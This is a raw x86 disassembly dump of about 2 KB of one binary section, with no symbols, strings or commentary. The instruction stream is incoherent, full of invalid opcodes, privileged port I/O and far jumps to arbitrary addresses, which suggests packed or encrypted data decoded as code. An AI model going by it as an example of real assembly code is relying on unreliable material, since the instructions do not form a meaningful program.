  41c1e6:	add    cl,dh
  41c1e8:	add    eax,0x909a4dd5
  41c1ed:	xchg   esi,eax
  41c1ee:	call   0x9a67:0x79e00138
  41c1f5:	jecxz  0x41c1a7
  41c1f7:	mov    eax,ds:0x26467e87
  41c1fc:	push   ss
  41c1fd:	(bad)  
  41c1fe:	xlat   BYTE PTR ds:[ebx]
  41c1ff:	lea    ebp,[edi-0x4a]
  41c202:	(bad)  
  41c204:	add    edx,DWORD PTR [ecx]
  41c206:	jmp    0x41c228
  41c208:	mov    edi,0x3c4447fc
  41c20d:	mov    al,ds:0xe8d1f3fe
  41c212:	and    DWORD PTR [edx-0x5ab3ae5e],ebx
  41c218:	xchg   ecx,eax
  41c219:	mov    eax,ds:0x1b8f85b
  41c21e:	fdiv   DWORD PTR [edi+0x33]
  41c221:	arpl   WORD PTR [ecx],dx
  41c223:	mov    bl,0x25
  41c225:	rep stos BYTE PTR es:[edi],al
  41c227:	pop    edx
  41c228:	jp     0x41c21f
  41c22a:	cwde   
  41c22b:	cmp    DWORD PTR [esi-0x5f],0xb20a9f24
  41c232:	hlt    
  41c233:	jg     0x41c215
  41c235:	icebp  
  41c236:	xchg   DWORD PTR [edi+0x3],ebp
  41c239:	repnz ins DWORD PTR es:[edi],dx
  41c23b:	cld    
  41c23c:	es jae 0x41c23b
  41c23f:	pop    es
  41c240:	sar    eax,0xf4
  41c243:	jmp    0x8af0e57b
  41c248:	mov    al,0x16
  41c24a:	sbb    eax,0x53564c58
  41c24f:	enter  0xd2a5,0x31
  41c253:	cli    
  41c254:	and    BYTE PTR [ebx+ecx*4+0x63],0xf3
  41c259:	cmp    al,0xd2
  41c25b:	and    dh,BYTE PTR [edi]
  41c25d:	xchg   ebp,eax
  41c25e:	sub    DWORD PTR [ebx],ebp
  41c260:	jecxz  0x41c21f
  41c262:	imul   BYTE PTR [ecx]
  41c264:	lock stos BYTE PTR es:[edi],al
  41c266:	fwait
  41c267:	scas   al,BYTE PTR es:[edi]
  41c268:	jnp    0x41c1fd
  41c26a:	aam    0x51
  41c26c:	jmp    FWORD PTR [edi]
  41c26e:	adc    eax,0x38e75853
  41c273:	cmp    DWORD PTR [ebp+0x10],0x3cadc244
  41c27a:	push   eax
  41c27b:	dec    edx
  41c27c:	and    eax,0x3e9123cb
  41c281:	push   ss
  41c282:	stc    
  41c283:	sahf   
  41c284:	inc    ebx
  41c285:	adc    al,BYTE PTR [ecx-0x6d1819bb]
  41c28b:	jns    0x41c286
  41c28d:	test   BYTE PTR [edi],cl
  41c28f:	mov    edx,0xa1c862a5
  41c294:	outs   dx,BYTE PTR ds:[esi]
  41c295:	mov    al,ds:0x698043b0
  41c29a:	mov    al,ds:0x7e2acd2b
  41c29f:	push   ss
  41c2a0:	fidiv  WORD PTR [ecx-0x41abe676]
  41c2a6:	frstor [edi]
  41c2a8:	out    dx,eax
  41c2a9:	or     ebp,DWORD PTR [esi+0x21]
  41c2ac:	sub    eax,0x5a70470a
  41c2b1:	int    0xfc
  41c2b3:	and    al,0x6c
  41c2b5:	xor    esp,eax
  41c2b7:	pop    ds
  41c2b8:	into   
  41c2b9:	and    ebp,DWORD PTR [edx+0x3e]
  41c2bc:	mov    edx,0xd97e79d6
  41c2c1:	mov    esp,0xa27760ee
  41c2c6:	sub    DWORD PTR [esi],ebp
  41c2c8:	push   0x490b756f
  41c2cd:	mov    esp,0x52ba3c04
  41c2d2:	xor    ecx,DWORD PTR [esi+0x5c]
  41c2d5:	adc    ah,BYTE PTR ds:0x2a163d0a
  41c2db:	mov    eax,ds:0xfba9440b
  41c2e0:	out    0x36,al
  41c2e2:	(bad)  
  41c2e4:	sub    BYTE PTR [edi],ch
  41c2e6:	jl     0x41c2ab
  41c2e8:	jp     0x41c310
  41c2ea:	cmp    dh,bl
  41c2ec:	leave  
  41c2ed:	outs   dx,BYTE PTR ds:[esi]
  41c2ee:	mov    dh,bh
  41c2f0:	nop
  41c2f1:	cmp    esp,DWORD PTR [edi-0x7a0b2b7b]
  41c2f7:	ja     0x41c365
  41c2f9:	cmp    DWORD PTR [edi],0x47444d1a
  41c2ff:	pop    eax
  41c300:	or     bl,al
  41c302:	fwait
  41c303:	das    
  41c304:	fs xor eax,0xc0b36bca
  41c30a:	mov    WORD PTR [ebp-0x1c],fs
  41c30d:	stos   DWORD PTR es:[edi],eax
  41c30e:	ins    BYTE PTR es:[edi],dx
  41c30f:	ins    BYTE PTR es:[edi],dx
  41c310:	popf   
  41c311:	pusha  
  41c312:	loop   0x41c342
  41c314:	pop    edx
  41c315:	stc    
  41c316:	jb     0x41c2e6
  41c318:	lds    edi,FWORD PTR [edx-0x60183733]
  41c31e:	test   al,0x12
  41c320:	add    BYTE PTR [ebx+0x38],0x88
  41c324:	jo     0x41c2d7
  41c326:	nop
  41c327:	stos   BYTE PTR es:[edi],al
  41c328:	gs adc eax,0x7e54b9d0
  41c32e:	cmp    eax,0xb493ff92
  41c333:	pop    ebx
  41c334:	outs   dx,BYTE PTR ds:[esi]
  41c335:	js     0x41c34c
  41c337:	jnp    0x41c350
  41c339:	ds sahf 
  41c33b:	jae    0x41c37c
  41c33d:	ret    0x38bc
  41c340:	sub    DWORD PTR [eax],edi
  41c342:	xor    al,BYTE PTR [ecx+0x2c]
  41c345:	sbb    dh,al
  41c347:	scas   eax,DWORD PTR es:[edi]
  41c348:	jp     0x41c2fd
  41c34a:	std    
  41c34b:	inc    edi
  41c34c:	pop    ecx
  41c34d:	call   0xced30097
  41c352:	inc    edi
  41c353:	sbb    al,0xf0
  41c355:	hlt    
  41c356:	cmp    eax,0xba183012
  41c35b:	and    eax,0xfa728f79
  41c360:	mov    eax,ds:0x1b10e767
  41c365:	push   ebx
  41c366:	pop    ebx
  41c367:	pop    esp
  41c368:	push   eax
  41c369:	xchg   DWORD PTR [ecx+edi*4],ecx
  41c36c:	fisttp DWORD PTR [ebp+0x41]
  41c36f:	inc    ebp
  41c370:	jne    0x41c2fc
  41c372:	jecxz  0x41c2fc
  41c374:	lods   eax,DWORD PTR ds:[esi]
  41c375:	iret   
  41c376:	xor    edi,eax
  41c378:	xor    ch,bl
  41c37a:	cmp    ebp,0x2f8e407e
  41c380:	sub    eax,DWORD PTR [esi-0x778d278]
  41c386:	dec    edi
  41c387:	scas   eax,DWORD PTR es:[edi]
  41c388:	add    eax,0xce2bb08c
  41c38d:	add    DWORD PTR [ebx+0x25],ecx
  41c390:	jecxz  0x41c32e
  41c392:	jb     0x41c36a
  41c394:	test   eax,0xd52029e8
  41c399:	push   edx
  41c39a:	inc    ebx
  41c39b:	fidivr WORD PTR [eax+0x23]
  41c39e:	mov    edx,DWORD PTR [edi+0x1]
  41c3a1:	stos   DWORD PTR es:[edi],eax
  41c3a2:	scas   al,BYTE PTR es:[edi]
  41c3a3:	popf   
  41c3a4:	mov    ds:0x20facf91,eax
  41c3a9:	iret   
  41c3aa:	adc    esp,DWORD PTR [edi]
  41c3ac:	fwait
  41c3ad:	sbb    DWORD PTR [ebp-0x6faa126a],esp
  41c3b3:	jne    0x41c36a
  41c3b5:	leave  
  41c3b6:	mov    ecx,0x5a1e38ea
  41c3bb:	(bad)  
  41c3bc:	fsub   st,st(6)
  41c3be:	xor    cl,BYTE PTR [esi+ecx*1]
  41c3c1:	jo     0x41c43e
  41c3c3:	pusha  
  41c3c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3c5:	loop   0x41c43b
  41c3c7:	pop    es
  41c3c8:	xor    eax,0x4e338e73
  41c3cd:	inc    esp
  41c3ce:	inc    esi
  41c3cf:	das    
  41c3d0:	lds    edi,FWORD PTR [ebx]
  41c3d2:	xchg   esp,eax
  41c3d3:	pop    ecx
  41c3d4:	inc    ebx
  41c3d5:	pop    edi
  41c3d6:	int3   
  41c3d7:	ins    DWORD PTR es:[edi],dx
  41c3d8:	and    cl,BYTE PTR [esi-0x1e]
  41c3db:	into   
  41c3dc:	into   
  41c3dd:	addr16 pop ebx
  41c3df:	xor    dl,BYTE PTR [esi]
  41c3e1:	je     0x41c444
  41c3e3:	cli    
  41c3e4:	or     BYTE PTR [esp+ecx*2],dl
  41c3e7:	mov    esp,esp
  41c3e9:	push   edi
  41c3ea:	lahf   
  41c3eb:	fadd   st(7),st
  41c3ed:	repz pop ecx
  41c3ef:	test   eax,0x7b468d01
  41c3f4:	sbb    al,0xcf
  41c3f6:	ficomp WORD PTR [edx+ecx*4-0x19]
  41c3fa:	je     0x41c3d9
  41c3fc:	adc    eax,0x9e214446
  41c401:	pop    ds
  41c402:	xlat   BYTE PTR ds:[ebx]
  41c403:	and    esi,0x31
  41c406:	dec    ebx
  41c407:	outs   dx,BYTE PTR ds:[esi]
  41c408:	adc    al,0x50
  41c40a:	add    BYTE PTR [edx-0x2c],ah
  41c40d:	rcl    BYTE PTR [ecx+0x1f],1
  41c410:	or     DWORD PTR [esi],esi
  41c412:	rcl    DWORD PTR [eax-0x499ff80d],0x26
  41c419:	cmp    DWORD PTR [eax-0x33d428f8],0x6143e3b3
  41c423:	leave  
  41c424:	pop    edx
  41c425:	out    dx,al
  41c426:	push   ss
  41c427:	jle    0x41c437
  41c429:	icebp  
  41c42a:	repnz mov esp,0x8b63b158
  41c430:	stos   DWORD PTR es:[edi],eax
  41c431:	fs adc ecx,0xf4bb9613
  41c438:	inc    ebp
  41c439:	xchg   edx,eax
  41c43a:	les    esi,FWORD PTR [ebp+0x27499658]
  41c440:	int3   
  41c441:	mov    al,0xcf
  41c443:	sub    al,0xcf
  41c445:	std    
  41c446:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c447:	xchg   ecx,eax
  41c448:	mov    WORD PTR [ecx-0x5d],es
  41c44b:	inc    ebx
  41c44c:	out    dx,eax
  41c44d:	(bad)  
  41c44e:	mov    eax,ds:0x8a7f64f9
  41c453:	leave  
  41c454:	fwait
  41c455:	lahf   
  41c456:	enter  0x3d24,0x11
  41c45a:	xlat   BYTE PTR ds:[ebx]
  41c45b:	mov    dh,BYTE PTR [edx+0x79e716b4]
  41c461:	inc    ecx
  41c462:	cmp    al,0xf8
  41c464:	push   ebp
  41c465:	iret   
  41c466:	pop    eax
  41c467:	or     DWORD PTR [eax-0x78],ebp
  41c46a:	sub    al,0xe
  41c46c:	loop   0x41c410
  41c46e:	add    ecx,ebp
  41c470:	sub    eax,0xdfa069a
  41c475:	mov    esp,0x8576a691
  41c47a:	pop    esp
  41c47b:	aas    
  41c47c:	inc    edi
  41c47d:	push   ds
  41c47e:	mov    edx,0xd5115a7b
  41c483:	and    eax,0xf0014e40
  41c488:	adc    BYTE PTR cs:[esi-0x5c2cdd01],0x2d
  41c490:	lea    ebp,[ebx]
  41c492:	fsubr  QWORD PTR [eax+0x69929f8d]
  41c498:	and    DWORD PTR [ebx-0x467c7e48],edi
  41c49e:	hlt    
  41c49f:	mov    eax,ds:0x34221ec9
  41c4a4:	push   edx
  41c4a5:	add    bl,bh
  41c4a7:	retf   0x25c4
  41c4aa:	xor    al,BYTE PTR [ecx-0x18]
  41c4ad:	aad    0xd6
  41c4af:	mov    ebx,0x1ddb3d6c
  41c4b4:	or     ch,cl
  41c4b6:	xor    eax,0xa981709d
  41c4bb:	sbb    DWORD PTR [eax+0x3b],edx
  41c4be:	mul    ah
  41c4c0:	imul   ecx,DWORD PTR [eax+edx*2-0x54],0x5aec71f7
  41c4c8:	pushf  
  41c4c9:	and    ebp,DWORD PTR [edi-0x4e]
  41c4cc:	pop    eax
  41c4cd:	int3   
  41c4ce:	mov    eax,0xd5088e27
  41c4d3:	js     0x41c515
  41c4d5:	fst    QWORD PTR [edi*4+0x546265a7]
  41c4dc:	fidivr DWORD PTR ds:0xbe6a84e
  41c4e2:	repz call DWORD PTR [edx+0x3b]
  41c4e6:	pop    esi
  41c4e7:	adc    DWORD PTR [ebx+0x16cd4343],esi
  41c4ed:	sbb    edi,DWORD PTR [eax+0x638515eb]
  41c4f3:	mov    eax,0x15cfd896
  41c4f8:	ficomp WORD PTR [bp+si]
  41c4fb:	pop    ecx
  41c4fc:	std    
  41c4fd:	push   ss
  41c4fe:	dec    eax
  41c4ff:	sar    DWORD PTR [esi],0x1c
  41c502:	or     al,0x3f
  41c504:	repnz (bad) 
  41c506:	xor    ch,cl
  41c508:	adc    al,0x41
  41c50a:	or     ecx,DWORD PTR [ebx+0x1eceff92]
  41c510:	mov    esi,0x91eb233c
  41c515:	mov    al,ds:0x1c1776a2
  41c51a:	and    al,0x3a
  41c51c:	(bad)  [ecx]
  41c51e:	imul   edi,DWORD PTR [ebx+ebp*2],0x6939d029
  41c525:	mov    esi,0xeeb589de
  41c52a:	inc    ebp
  41c52b:	test   al,0x86
  41c52d:	jns    0x41c4c6
  41c52f:	cwde   
  41c530:	sub    bh,BYTE PTR [eax+eax*8+0x2e7f66b3]
  41c537:	jmp    0xb7a525e2
  41c53c:	sbb    DWORD PTR [eax],ebx
  41c53e:	sbb    eax,0xaa032793
  41c543:	push   ebx
  41c544:	dec    ecx
  41c545:	and    ch,cl
  41c547:	pop    es
  41c548:	(bad)  
  41c54a:	add    bh,cl
  41c54c:	push   eax
  41c54d:	cmp    esi,eax
  41c54f:	sbb    esi,DWORD PTR [ebx]
  41c551:	jns    0x41c5c5
  41c553:	lock cmp DWORD PTR [ebx+0x7f882dd],edi
  41c55a:	add    bl,BYTE PTR [ebx-0x443ec392]
  41c560:	xchg   BYTE PTR [ecx],bl
  41c562:	cs fs pop ebx
  41c565:	and    DWORD PTR es:[edx+0x28514ee8],ebp
  41c56c:	inc    edx
  41c56d:	mov    ds:0xff9c8fb9,al
  41c572:	mov    DWORD PTR [ebx+0x6e],eax
  41c575:	scas   al,BYTE PTR es:[edi]
  41c576:	int3   
  41c577:	cmp    eax,0xa6f34988
  41c57c:	shl    BYTE PTR [eax-0x3d],1
  41c57f:	mov    ecx,0xb625c90a
  41c584:	cld    
  41c585:	xlat   BYTE PTR ds:[ebx]
  41c586:	pop    edi
  41c587:	xor    eax,0xea42af03
  41c58c:	pop    ebp
  41c58d:	cmc    
  41c58e:	(bad)
  41c591:	push   eax
  41c592:	jmp    0x11b7:0x78e8ea04
  41c599:	(bad)  
  41c59a:	xchg   edi,eax
  41c59b:	push   es
  41c59c:	(bad)  
  41c59d:	(bad)  
  41c59f:	pop    ebp
  41c5a0:	jp     0x41c5e8
  41c5a2:	jne    0x41c53d
  41c5a4:	das    
  41c5a5:	sbb    ebp,DWORD PTR [ecx+ebx*8-0x59]
  41c5a9:	mov    cl,0xca
  41c5ab:	cmp    eax,0xf56d07c2
  41c5b0:	icebp  
  41c5b1:	mov    edi,0xc6007d2
  41c5b6:	dec    esp
  41c5b7:	mov    ?,WORD PTR [eax+0x59]
  41c5ba:	add    BYTE PTR [eax],dl
  41c5bc:	adc    eax,0xd8d0a3cc
  41c5c1:	arpl   WORD PTR [edi+0x78],dx
  41c5c4:	push   esp
  41c5c5:	stc    
  41c5c6:	hlt    
  41c5c7:	pushf  
  41c5c8:	push   ds
  41c5c9:	adc    edx,DWORD PTR [edi+0x18f01295]
  41c5cf:	imul   eax,esp,0x9e91f4ee
  41c5d5:	jno    0x41c590
  41c5d7:	mov    ah,BYTE PTR [esi+0x4cd3d7d3]
  41c5dd:	loop   0x41c61d
  41c5df:	add    ecx,eax
  41c5e1:	and    al,0x9c
  41c5e3:	sub    ch,BYTE PTR [eax+0x76]
  41c5e6:	(bad)  
  41c5e7:	and    cl,bl
  41c5e9:	jle    0x41c615
  41c5eb:	stc    
  41c5ec:	pop    ecx
  41c5ed:	jge    0x41c668
  41c5ef:	(bad)  
  41c5f0:	dec    esi
  41c5f1:	jae    0x41c5cd
  41c5f3:	stos   BYTE PTR es:[edi],al
  41c5f4:	sub    eax,0x2412ac21
  41c5f9:	call   0xfcc4:0x16c86da8
  41c600:	repz xlat BYTE PTR ds:[ebx]
  41c602:	imul   edi,DWORD PTR [edx],0xffffffcc
  41c605:	daa    
  41c606:	mov    dh,0xc3
  41c608:	sar    dh,1
  41c60a:	push   0x93b37b4c
  41c60f:	dec    edx
  41c610:	data16 rcr BYTE PTR [ebp+0x2e],cl
  41c614:	xchg   esi,eax
  41c615:	push   edx
  41c616:	shl    BYTE PTR [eax+0x37],0xe5
  41c61a:	call   0x89fb:0xec192eb2
  41c621:	mov    al,0x10
  41c623:	mov    dh,0xe
  41c625:	test   al,0x1a
  41c627:	sahf   
  41c628:	iret   
  41c629:	lods   eax,DWORD PTR ds:[esi]
  41c62a:	pusha  
  41c62b:	ins    DWORD PTR es:[edi],dx
  41c62c:	push   0x215afcd2
  41c631:	stc    
  41c632:	push   esp
  41c633:	dec    ebx
  41c634:	push   cs
  41c635:	(bad)  
  41c636:	frstor [eax+0x7d5e1b3e]
  41c63c:	add    ebx,DWORD PTR [ecx-0x5df5d518]
  41c642:	div    eax
  41c644:	mov    al,0x4f
  41c646:	int    0x8
  41c648:	mov    bl,0x9
  41c64a:	dec    esp
  41c64b:	sub    ch,BYTE PTR [ebp+0x43]
  41c64e:	iret   
  41c64f:	xchg   DWORD PTR [esp+edi*1],esi
  41c652:	inc    esi
  41c653:	gs jbe 0x41c68d
  41c656:	jb     0x41c612
  41c658:	imul   eax,eax,0x4b
  41c65b:	push   0x16
  41c65d:	in     eax,0xaf
  41c65f:	(bad)
  41c663:	mov    al,ds:0x29daf4f8
  41c668:	int    0x3b
  41c66a:	fstp   TBYTE PTR [ebp+0x7a830732]
  41c670:	rcl    BYTE PTR [esi+0x5d4824cd],cl
  41c676:	adc    DWORD PTR [eax-0x574f931c],0xe9401545
  41c680:	xchg   DWORD PTR [eax-0x5e],edi
  41c683:	add    al,0x88
  41c685:	mov    ds:0x84e4793f,al
  41c68a:	cdq    
  41c68b:	aam    0x7f
  41c68d:	pop    esp
  41c68e:	loop   0x41c684
  41c690:	loope  0x41c6a6
  41c692:	sbb    esi,ebx
  41c694:	xor    al,0xf5
  41c696:	mov    ebp,0x759f682c
  41c69b:	lods   eax,DWORD PTR ds:[esi]
  41c69c:	add    edi,eax
  41c69e:	inc    esi
  41c69f:	stc    
  41c6a0:	fs (bad) 
  41c6a2:	std    
  41c6a3:	nop
  41c6a4:	or     edx,DWORD PTR [edi]
  41c6a6:	xchg   al,dl
  41c6a8:	(bad)  
  41c6a9:	mov    ecx,0xc47bb896
  41c6ae:	sub    edx,DWORD PTR [eax]
  41c6b0:	jge    0x41c637
  41c6b2:	mov    ah,0xf2
  41c6b4:	lea    esp,[edi-0x28]
  41c6b7:	xor    eax,0x103b648
  41c6bc:	adc    BYTE PTR [ecx+0x38],cl
  41c6bf:	or     di,WORD PTR ds:0x9af1dba5
  41c6c6:	retf   0xcead
  41c6c9:	fidiv  DWORD PTR [esi]
  41c6cb:	xchg   BYTE PTR [eax+0x7d],dh
  41c6ce:	jb     0x41c6d1
  41c6d0:	push   ecx
  41c6d1:	test   eax,edx
  41c6d3:	(bad)  
  41c6d4:	ins    BYTE PTR es:[edi],dx
  41c6d5:	cmp    eax,0xb8fc775
  41c6da:	jne    0x41c6fd
  41c6dc:	inc    ecx
  41c6dd:	pusha  
  41c6de:	stos   BYTE PTR es:[edi],al
  41c6df:	inc    esp
  41c6e0:	mov    cl,0xd2
  41c6e2:	mov    bl,0x63
  41c6e4:	lock daa 
  41c6e6:	dec    ebp
  41c6e7:	xor    al,0x3b
  41c6e9:	outs   dx,DWORD PTR ds:[esi]
  41c6ea:	inc    edi
  41c6eb:	fucomi st,st(6)
  41c6ed:	dec    ebp
  41c6ee:	out    0xa2,al
  41c6f0:	sbb    dl,BYTE PTR [ebp+0x4e]
  41c6f3:	or     al,0x4c
  41c6f5:	and    eax,0xff53d248
  41c6fa:	repnz lock push ecx
  41c6fd:	add    eax,0x6660d196
  41c702:	cmp    BYTE PTR [esi],dh
  41c704:	and    DWORD PTR [eax-0x555c901],ecx
  41c70a:	push   ss
  41c70b:	and    DWORD PTR [esi-0x9a0e854],0x8ec41bd3
  41c715:	dec    edi
  41c716:	sub    edi,ebx
  41c718:	sub    al,0x77
  41c71a:	and    DWORD PTR [edi+esi*1-0x7485c3d8],ecx
  41c721:	lods   eax,DWORD PTR ds:[esi]
  41c722:	loopne 0x41c75b
  41c724:	dec    edx
  41c725:	retf   0x260
  41c728:	xchg   edi,eax
  41c729:	into   
  41c72a:	mov    al,0x0
  41c72c:	and    DWORD PTR [eax+0x44],0x5c105619
  41c733:	mov    ebx,0x8c64d5d9
  41c738:	hlt    
  41c739:	jmp    0x7a450f4
  41c73e:	and    dl,ch
  41c740:	inc    ebp
  41c741:	sahf   
  41c742:	sbb    eax,0x62a3b6da
  41c747:	mov    dl,0x9d
  41c749:	aas    
  41c74a:	push   edx
  41c74b:	sub    edi,edi
  41c74d:	jb     0x41c72b
  41c74f:	sbb    ebp,DWORD PTR [esi+0x7657e7b9]
  41c755:	and    cl,BYTE PTR [edi+0x1d]
  41c758:	mov    DWORD PTR [ecx+0x70],0x5156355a
  41c75f:	sbb    eax,0x3a719b09
  41c764:	call   0x35c8c4e
  41c769:	iret   
  41c76a:	fidivr DWORD PTR [ecx+0x49]
  41c76d:	je     0x41c789
  41c76f:	xchg   esp,eax
  41c770:	hlt    
  41c771:	and    edx,DWORD PTR [ebp+0xf]
  41c774:	adc    al,0xab
  41c776:	adc    ch,bl
  41c778:	xchg   BYTE PTR [edi],dh
  41c77a:	or     esp,DWORD PTR [ebp-0x54970693]
  41c780:	inc    eax
  41c781:	add    al,0x92
  41c784:	pop    ds
  41c785:	mov    eax,0x195dfad7
  41c78a:	dec    esi
  41c78b:	rcr    DWORD PTR [edi-0x6724b4bc],1
  41c791:	(bad)  
  41c792:	sub    ebp,DWORD PTR [eax]
  41c794:	es daa 
  41c796:	adc    BYTE PTR [ecx+0x6d3ec368],cl
  41c79c:	push   esp
  41c79d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c79e:	fisttp QWORD PTR [esi-0x147ef3a0]
  41c7a4:	push   ebx
  41c7a5:	add    BYTE PTR [ecx-0x4869e1d5],0x6b
  41c7ac:	cmp    eax,0xb4a7c734
  41c7b1:	or     dh,ch
  41c7b3:	jge    0x41c7bb
  41c7b5:	inc    edi
  41c7b6:	sub    al,BYTE PTR [esi+ebp*1]
  41c7b9:	and    BYTE PTR ds:0x7b5886df,bl
  41c7bf:	rol    DWORD PTR [esp+edx*2-0x18],1
  41c7c3:	enter  0x65da,0xd8
  41c7c7:	fcom   DWORD PTR [ebp+esi*1+0x41fa999d]
  41c7ce:	adc    bh,BYTE PTR [edi-0x13]
  41c7d1:	out    0x10,eax
  41c7d3:	add    al,0xdc
  41c7d5:	loop   0x41c75a
  41c7d7:	sbb    al,0x45
  41c7d9:	fdiv   QWORD PTR [edi-0x42320d2b]
  41c7df:	clc    
  41c7e0:	inc    eax
  41c7e1:	adc    ebx,DWORD PTR [esi+0x1520f06]
  41c7e7:	push   eax
  41c7e8:	adc    al,BYTE PTR [esi]
  41c7ea:	int    0xe0
  41c7ec:	mov    ecx,0xe66ae347
  41c7f1:	nop
  41c7f2:	(bad)  
  41c7f3:	or     eax,0x274387ad
  41c7f8:	mov    edx,0x511761da
  41c7fd:	mov    bl,0x88
  41c7ff:	leave  
  41c800:	inc    DWORD PTR [edi+eax*1+0x3092a8c2]
  41c807:	pop    esp
  41c808:	push   cs
  41c809:	call   0x39cc2f20
  41c80e:	enter  0x4dea,0x3c
  41c812:	adc    eax,0xc8ac6e2f
  41c817:	sbb    al,0x20
  41c819:	loope  0x41c79b
  41c81b:	mov    WORD PTR [edx],gs
  41c81d:	aaa    
  41c81e:	push   0x63b6178
  41c823:	xchg   al,cl
  41c825:	jae    0x41c8a4
  41c827:	fyl2xp1 
  41c829:	addr16 jno 0x41c801
  41c82c:	imul   edx,ebp,0xffffff88
  41c82f:	js     0x41c7c5
  41c831:	and    eax,0x77002c4b
  41c836:	je     0x41c852
  41c838:	push   cs
  41c839:	std    
  41c83a:	dec    eax
  41c83b:	loope  0x41c89f
  41c83d:	dec    esp
  41c83e:	icebp  
  41c83f:	or     al,0xdd
  41c841:	push   esp
  41c842:	out    0x3c,al
  41c844:	and    eax,0x6a6eaf5f
  41c849:	fsub   st,st(6)
  41c84b:	ret    
  41c84c:	out    0x16,eax
  41c84e:	inc    edx
  41c84f:	je     0x41c89f
  41c851:	sbb    dl,BYTE PTR [eax]
  41c853:	mov    dl,0x4d
  41c855:	cmc    
  41c856:	cmp    al,0x2e
  41c858:	sbb    DWORD PTR [eax+eax*8-0x11],esp
  41c85c:	out    dx,al
  41c85d:	dec    eax
  41c85e:	xchg   BYTE PTR ds:0x653150ba,al
  41c864:	add    eax,DWORD PTR [esi-0x674729bf]
  41c86a:	or     esi,DWORD PTR [eax+eiz*1]
  41c86d:	inc    esi
  41c86e:	outs   dx,BYTE PTR ds:[esi]
  41c86f:	repnz mov ch,0x50
  41c872:	imul   ebx,DWORD PTR [ebp+0x4c],0x57
  41c876:	cmp    DWORD PTR [ecx],0x2c275b8b
  41c87c:	cmc    
  41c87d:	xchg   ecx,eax
  41c87e:	pusha  
  41c87f:	repnz sbb ecx,edi
  41c882:	int3   
  41c883:	and    BYTE PTR [eax],0x1
  41c886:	sub    al,0x9e
  41c888:	add    ah,BYTE PTR [ecx]
  41c88a:	idiv   DWORD PTR [esi]
  41c88c:	loopne 0x41c8d4
  41c88e:	mov    al,ds:0xd45ee790
  41c893:	pop    esp
  41c894:	test   eax,0xdf6b2f55
  41c899:	sbb    ch,BYTE PTR [edx+ebp*4]
  41c89c:	ror    BYTE PTR [ebx],1
  41c89e:	mov    bh,0xfa
  41c8a0:	out    dx,al
  41c8a1:	dec    esi
  41c8a2:	test   DWORD PTR [ecx],0xdba7147d
  41c8a8:	push   0xb96c4e10
  41c8ad:	scas   al,BYTE PTR es:[edi]
  41c8ae:	jo     0xa2fcf177
  41c8b4:	jmp    0x6d4dab3b
  41c8b9:	xchg   ebp,eax
  41c8ba:	mov    cl,0xc6
  41c8bc:	or     al,0x5e
  41c8be:	fyl2x  
  41c8c0:	out    0xf0,al
  41c8c2:	xor    al,0xc6
  41c8c4:	mov    BYTE PTR [ebp-0xd],bl
  41c8c7:	sub    DWORD PTR [esp+ecx*1],esi
  41c8ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c8cb:	mov    esp,0x3958d711
  41c8d0:	dec    edi
  41c8d1:	pop    ebp
  41c8d2:	jb     0x41c8d2
  41c8d4:	call   0xe2d6:0x6ee5ae97
  41c8db:	cmp    al,0x46
  41c8dd:	xor    al,0xc6
  41c8df:	and    BYTE PTR [eax],dh
  41c8e1:	mov    edi,0x9640e78
  41c8e6:	xchg   edx,eax
  41c8e7:	or     DWORD PTR [edi],esi
  41c8e9:	jp     0x41c8c0
  41c8eb:	rcr    DWORD PTR [edx+eax*2-0x430de8ed],0x22
  41c8f3:	int    0xf5
  41c8f5:	mov    ah,0xd2
  41c8f7:	nop
  41c8f8:	jne    0x41c921
  41c8fa:	daa    
  41c8fb:	adc    al,0xa0
  41c8fd:	pop    ds
  41c8fe:	lidtd  [ecx]
  41c901:	repnz sub al,0x3c
  41c904:	test   DWORD PTR [ebx-0x5a0e2f3],esp
  41c90a:	pop    ebp
  41c90b:	sbb    al,al
  41c90d:	mov    ah,ch
  41c90f:	xchg   ebp,eax
  41c910:	mov    esi,0xc8e1a6a
  41c915:	data16 mov ah,0x16
  41c918:	mov    DWORD PTR [ebp-0x4e],eax
  41c91b:	and    DWORD PTR [eax-0x35],ecx
  41c91e:	xlat   BYTE PTR ds:[ebx]
  41c91f:	cld    
  41c920:	(bad)  
  41c921:	jp     0x41c8fe
  41c923:	dec    esp
  41c924:	sub    DWORD PTR [ebp-0x35b6cab4],0x44
  41c92b:	aaa    
  41c92c:	cmp    cl,BYTE PTR [esi]
  41c92e:	ins    DWORD PTR es:[edi],dx
  41c92f:	icebp  
  41c930:	int3   
  41c931:	cmc    
  41c932:	ret    0xbaa9
  41c935:	add    ebx,DWORD PTR [ecx+0x6d]
  41c938:	jbe    0x41c966
  41c93a:	mov    al,0xd8
  41c93c:	jg     0x41c988
  41c93e:	mov    esp,0x8244c2b6
  41c943:	mov    cl,0x4e
  41c945:	mov    al,ds:0xf3546871
  41c94a:	sbb    eax,0xd03aaf9f
  41c94f:	imul   eax,DWORD PTR [ecx+eax*1],0x78d876fe
  41c956:	je     0x41c9b5
  41c958:	mov    esp,0x9bd63cc2
  41c95d:	inc    ecx
  41c95e:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41c960:	jo     0x41c909
  41c962:	xchg   ebx,eax
  41c963:	loopne 0x41c946
  41c965:	fst    DWORD PTR [edi+eax*4-0x6c]
  41c969:	rcr    edx,1
  41c96b:	pushf  
  41c96c:	mov    bh,0xc2
  41c96e:	sbb    al,BYTE PTR [edx+ebx*4-0x2]
  41c972:	push   0xffffff98
  41c974:	popa   
  41c975:	jmp    0x5d7e9ab7
  41c97a:	jnp    0x41c9c6
  41c97c:	nop
  41c97d:	xor    BYTE PTR [ecx-0x4e595acb],dl
  41c983:	mov    ds:0xae8c3df9,eax
  41c988:	adc    dl,BYTE PTR [eax]
  41c98a:	popf   
  41c98b:	imul   edx,DWORD PTR [ebx-0x5b536da4],0xffffffec
  41c992:	pop    eax
  41c993:	lods   al,BYTE PTR ds:[esi]
  41c994:	test   BYTE PTR [eax],cl
  41c996:	mov    ch,0xd3
  41c998:	pop    ecx
  41c999:	lock xchg esp,eax
  41c99b:	fdivr  QWORD PTR [esi-0x4]
  41c99e:	jge    0x41c9eb
  41c9a0:	xchg   esi,esi
  41c9a2:	mov    DWORD PTR [edi-0x7f],esi
  41c9a5:	jl     0x41ca03
  41c9a7:	ret    
  41c9a8:	push   ds
